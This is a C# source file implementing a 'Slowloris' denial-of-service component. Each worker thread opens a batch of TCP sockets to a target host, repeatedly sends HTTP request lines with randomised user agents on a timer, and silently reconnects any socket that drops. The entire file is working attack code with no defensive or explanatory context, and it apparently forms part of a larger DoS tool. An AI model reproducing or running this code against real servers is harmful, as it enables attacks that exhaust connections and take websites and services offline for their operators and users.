using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;


    internal class Slowloris
    {
        public static IPEndPoint Host;
        public static bool IsEnabled;
        public static string Method;
        public static int socketsPerThread = 10;
        public static int interval = 20000;

        public static void WorkerThread()
        {
            List<Socket> connectionList = new List<Socket>();

            for (int i = 0; i <= socketsPerThread - 1; i++)
            {
                Socket tempClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                tempClient.Connect(Host);
                connectionList.Add(tempClient);
            }

            while (IsEnabled)
            {
                for (int i = 0; i <= socketsPerThread - 1; i++)
                {
                    try
                    {
                        connectionList[i].Send(ASCIIEncoding.ASCII.GetBytes(Method + " / HTTP/1.1\r\nHost: " + Host + "\r\nUser-Agent: " + Tools.GenerateRandomUserAgent() + "\r\n\r\n"), SocketFlags.None);
                    }
                    catch
                    {
                        try
                        {
                            connectionList[i] = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                            connectionList[i].Connect(Host);
                        }
                        catch { }
                    }
                }
                Thread.Sleep(interval);
                GC.Collect();
            }
        }
    }